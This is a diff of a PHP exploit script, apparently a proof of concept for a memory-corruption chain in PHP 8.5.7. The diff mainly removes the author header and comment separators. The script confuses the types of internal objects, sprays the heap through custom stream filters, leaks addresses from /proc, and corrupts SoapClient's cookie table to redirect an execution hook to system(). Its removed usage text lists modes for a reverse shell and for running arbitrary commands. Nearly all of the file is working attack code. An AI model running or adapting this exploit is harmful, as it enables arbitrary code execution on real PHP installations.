@@ -1,60 +1,19 @@
 <?php
-/**
- * PHP 8.5.7 — StreamBucket/SoapClient RCE Chain (PHP2SHELL variant)
- *
- * Author  : sn0x-sharma (Sanket Sharma)
- * Handle  : sn0x / orderinmoto
- * Contact : sanketsharmacsec@gmail.com | ordern0x@proton.me
- * GitHub  : https://github.com/sn0x-sharma
- *
- * Vulnerability chain:
- *   1. ArrayIterator property-type confusion on internal objects (StreamBucket, SoapClient)
- *   2. StreamBucket::data type-confusion → native code reads zval as string pointer
- *   3. Stream filter allocations + marker spray → heap observation / address leak
- *   4. SoapClient::_cookies corrupted to point at forged HashTable
- *   5. Numeric Set-Cookie name triggers zend_symtable_update() on the forged table
- *   6. Corrupted zend_execute_internal hook → dispatch to zif_system()
- *
- * Usage:
- *   php sn0xPoc.php [mode] [command]
- *
- *   Modes:
- *     --marker      (default) Write PHP857_RCE marker to /tmp — Linux proof
- *     --calc        Pop calculator — Windows calc.exe / Linux xcalc
- *     --shell       Bind a reverse shell (requires --lhost / --lport)
- *     --cmd         Run arbitrary command supplied as second argument
- *     --info        Print process / address info and exit (dry-run, no exec)
- *
- *   Examples:
- *     php sn0xPoc.php --marker
- *     php sn0xPoc.php --calc
- *     php sn0xPoc.php --cmd "id > /tmp/pwned"
- *     php sn0xPoc.php --shell --lhost 127.0.0.1 --lport 4444
- *     php sn0xPoc.php --info
- *
- * Tested on:
- *   PHP 8.5.7 CLI — Linux x86_64 — SOAP extension enabled
- *
- * NOTE: Offsets are build-specific. Re-derive ZEND_EXECUTE_INTERNAL_OFF
- *       and ZIF_SYSTEM_OFF from your target binary using:
- *         nm -D /usr/bin/php8.5 | grep -E 'zend_execute_internal|zif_system'
- */
 
 declare(strict_types=1);
 error_reporting(E_ALL & ~E_DEPRECATED);
 
-// ──────────────────────────────────────────────────────────────────────────────
-//  Build-specific constants  (PHP 8.5.7 x86_64 Linux — re-derive per binary)
-// ──────────────────────────────────────────────────────────────────────────────
+//  Build-specific constants  (PHP 8.5.7 x86_64 Linux re-derive per binary)
+
 const PHP_STREAM_BUCKET_TAIL_OFFSET = 40;
 const FAKE_HT_MARKER_OFFSET         = 56;
 const ZEND_EXECUTE_INTERNAL_OFF     = 0x1ce3030;   // offset from PIE base
 const ZIF_SYSTEM_OFF                = 0x69f130;    // offset from PIE base
 const U32                           = 4294967296;
 
-// ──────────────────────────────────────────────────────────────────────────────
+
 //  CLI argument parsing
-// ──────────────────────────────────────────────────────────────────────────────
+
 function parse_args(array $argv): array {
     $mode  = '--marker';
     $cmd   = null;
@@ -78,9 +37,8 @@ function parse_args(array $argv): array {
     return compact('mode', 'cmd', 'lhost', 'lport');
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  Build the shell command for the requested mode
-// ──────────────────────────────────────────────────────────────────────────────
+
 function build_command(array $args): string {
     $markerPath = '/tmp/php857_rce_' . getmypid() . '.txt';
 
@@ -121,9 +79,7 @@ function build_command(array $args): string {
     }
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  Core primitives
-// ──────────────────────────────────────────────────────────────────────────────
 
 /**
  * Type-confusion property write via ArrayIterator.
@@ -182,9 +138,7 @@ function run_filter(string $name): string {
     return stream_get_contents($fp);
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  Process / binary introspection  (Linux /proc)
-// ──────────────────────────────────────────────────────────────────────────────
 
 function php_binary_base(): int {
     $binary = PHP_BINARY;
@@ -249,9 +203,7 @@ function select_hash_mask(int $arData, int $hashLow32): array {
     throw new RuntimeException('[!] Failed to locate compatible hash slot in RW section');
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  Custom stream filter — stage 1: heap spray + bucket overread
-// ──────────────────────────────────────────────────────────────────────────────
 
 final class FakeHashFilter extends php_user_filter {
     public static int    $victimLen  = 262144;
@@ -292,9 +244,7 @@ final class FakeHashFilter extends php_user_filter {
     }
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  Custom stream filter — stage 2: address overread
-// ──────────────────────────────────────────────────────────────────────────────
 
 final class OverreadFilter extends php_user_filter {
     public static int   $fakeStringPointer = 0;
@@ -317,9 +267,7 @@ final class OverreadFilter extends php_user_filter {
     }
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  Marker search
-// ──────────────────────────────────────────────────────────────────────────────
 
 function marker_offset(string $data, string $tag): array {
     $regex = '/RH' . preg_quote($tag, '/') . '[0-9]{6}/';
@@ -329,9 +277,7 @@ function marker_offset(string $data, string $tag): array {
     return [$match[0][0], $match[0][1], (int) substr($match[0][0], -6)];
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  Minimal SOAP response server  (loopback, single-connection)
-// ──────────────────────────────────────────────────────────────────────────────
 
 function http_server(int $port, string $readyPath, string $capturePath, string $cookieName): never {
     $server = stream_socket_server("tcp://127.0.0.1:$port", $errno, $errstr);
@@ -431,16 +377,14 @@ function start_server(string $capturePath, string $cookieName): array {
     throw new RuntimeException('[!] Failed to start local SOAP response server');
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  Sub-process entry point: loopback HTTP server
-// ──────────────────────────────────────────────────────────────────────────────
+
 if (($argv[1] ?? '') === 'server') {
     http_server((int) $argv[2], $argv[3], $argv[4], $argv[5]);
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  Pre-flight checks
-// ──────────────────────────────────────────────────────────────────────────────
+
 if (!class_exists(SoapClient::class)) {
     fwrite(STDERR, "[!] SOAP extension required — recompile PHP with --enable-soap\n");
     exit(1);
@@ -459,9 +403,8 @@ echo "[*] Command : $command\n";
 echo "[*] PHP     : " . PHP_VERSION . " (" . PHP_BINARY . ")\n";
 echo "[*] PID     : " . getmypid() . "\n\n";
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  --info mode: dry-run, print addresses and exit
-// ──────────────────────────────────────────────────────────────────────────────
+
 if ($args['mode'] === '--info') {
     $base                = php_binary_base();
     $zendExecuteInternal = $base + ZEND_EXECUTE_INTERNAL_OFF;
@@ -477,9 +420,8 @@ if ($args['mode'] === '--info') {
     exit(0);
 }
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  Stage 0: Resolve build-specific addresses
-// ──────────────────────────────────────────────────────────────────────────────
+
 echo "[+] Stage 0: Resolving addresses...\n";
 $base                = php_binary_base();
 $zendExecuteInternal = $base + ZEND_EXECUTE_INTERNAL_OFF;
@@ -498,9 +440,8 @@ printf("    hash_slot             = 0x%016x\n", $hashSlot);
 printf("    hash_index            = 0x%08x\n",  $hashIndex);
 printf("    hash_mask             = 0x%08x\n",  $hashMask);
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  Stage 1 & 2: Register filters, run heap spray + overread
-// ──────────────────────────────────────────────────────────────────────────────
+
 echo "\n[+] Stage 1: Registering filters...\n";
 FakeHashFilter::$tag    = bin2hex(random_bytes(4));
 FakeHashFilter::$arData = $fakeArData;
@@ -525,18 +466,16 @@ printf("    fake_marker           = %s (index=%d offset=%d)\n",
     $fakeMarker, $fakeIndex, $fakeMarkerOffset);
 printf("    fake_hash_address     = 0x%016x\n", $fakeHashAddress);
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  Stage 4: Start loopback SOAP server
-// ──────────────────────────────────────────────────────────────────────────────
+
 echo "\n[+] Stage 4: Starting loopback SOAP response server...\n";
 $capturePath = sys_get_temp_dir() . '/php857-rce-capture-' . getmypid() . '.txt';
 @unlink($capturePath);
 [$port, $proc, $pipes, $readyPath] = start_server($capturePath, $cookieName);
 printf("    server listening on 127.0.0.1:%d\n", $port);
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  Stage 5: Corrupt SoapClient::_cookies and trigger the cookie-update path
-// ──────────────────────────────────────────────────────────────────────────────
+
 echo "\n[+] Stage 5: Corrupting SoapClient cookie table...\n";
 $client = new SoapClient(null, [
     'location' => "http://127.0.0.1:$port/",
@@ -556,16 +495,14 @@ foreach ($pipes as $pipe) {
 proc_close($proc);
 @unlink($readyPath);
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  Stage 7: Trigger corrupted dispatch → zif_system() → command execution
-// ──────────────────────────────────────────────────────────────────────────────
+
 echo "\n[+] Stage 7: Pulling trigger — invoking corrupted dispatch hook...\n";
 $trigger = 'md5';
 $trigger($command);
 
-// ──────────────────────────────────────────────────────────────────────────────
 //  Proof check  (marker mode only)
-// ──────────────────────────────────────────────────────────────────────────────
+
 if ($args['mode'] === '--marker') {
     $mp = defined('MARKER_PATH') ? MARKER_PATH : '/tmp/php857_rce_' . getmypid() . '.txt';
     echo "\n[*] Checking marker file: $mp\n";
